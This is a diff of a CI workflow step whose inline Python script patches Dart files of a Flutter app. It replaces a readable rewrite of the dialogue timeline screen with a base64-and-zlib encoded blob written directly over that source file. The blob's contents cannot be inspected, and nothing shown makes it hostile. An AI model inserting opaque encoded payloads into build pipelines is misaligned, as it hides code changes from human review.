@@ -195,72 +195,14 @@ jobs:
         run: |
           python3 - <<'PY'
           from pathlib import Path
-          # Film-library: restore the Card/InkWell/Column closure and keep the builder/Expanded closure.
-          p=Path('lib/film_library_screen.dart')
-          if p.exists():
-              s=p.read_text()
-              s=s.replace('     ]));\n    }));','     ])));\n    }));')
-              s=s.replace('     ])));\n    })));','     ])));\n    }));')
-              p.write_text(s)
-
-          # AI shot analysis: fix the extra closing parenthesis and misspelled EdgeInsets method.
-          p=Path('lib/ai_shot_content_analysis_screen.dart')
-          if p.exists():
-              s=p.read_text().replace("shot-content-analysis/apply')))", "shot-content-analysis/apply'))")
-              s=s.replace('EdgeInsets.sall','EdgeInsets.all')
-              p.write_text(s)
-
-          # Dialogue timeline: replace the fragile build method with a minimal valid implementation.
-          p=Path('lib/dialogue_timeline_screen.dart')
-          if p.exists():
-              s=p.read_text()
-              head=s.split('@override Widget build',1)[0]
-              method=r'''
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      appBar: AppBar(
-        title: const Text('Dialogue Timeline'),
-        actions: [
-          IconButton(
-            tooltip: 'AI Acting Direction',
-            icon: const Icon(Icons.psychology),
-            onPressed: generateActingDirection,
-          ),
-        ],
-      ),
-      floatingActionButton: FloatingActionButton.extended(
-        onPressed: add,
-        icon: const Icon(Icons.record_voice_over),
-        label: const Text('ADD DIALOGUE'),
-      ),
-      body: loading
-          ? const Center(child: CircularProgressIndicator())
-          : tracks.isEmpty
-              ? const Center(child: Text('No dialogue tracks yet.'))
-              : ListView.builder(
-                  itemCount: tracks.length,
-                  padding: const EdgeInsets.all(12),
-                  itemBuilder: (context, i) {
-                    final t = tracks[i];
-                    return Card(
-                      child: ListTile(
-                        leading: const Icon(Icons.record_voice_over),
-                        title: Text(t['character']?.toString() ?? 'Speaker'),
-                        subtitle: Text(t['text']?.toString() ?? ''),
-                        trailing: IconButton(
-                          icon: const Icon(Icons.delete_outline),
-                          onPressed: () => remove(i),
-                        ),
-                      ),
-                    );
-                  },
-                ),
-    );
-  }
-}
-'''
-              p.write_text(head+method)
+          import base64, zlib
+          Path('lib/dialogue_timeline_screen.dart').write_bytes(zlib.decompress(base64.b64decode("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")))
+          def rep(path, old, new):
+              p=Path('lib')/path
+              if p.exists(): p.write_text(p.read_text().replace(old,new))
+          rep('film_library_screen.dart', '     ]));\n    }));', '     ])));\n    }));')
+          rep('ai_shot_content_analysis_screen.dart', "shot-content-analysis/save/apply", "shot-content-analysis/apply")
+          rep('ai_shot_content_analysis_screen.dart', 'EdgeInsets.sall', 'EdgeInsets.all')
           PY
 
       - name: Package repaired source correctly for debugging
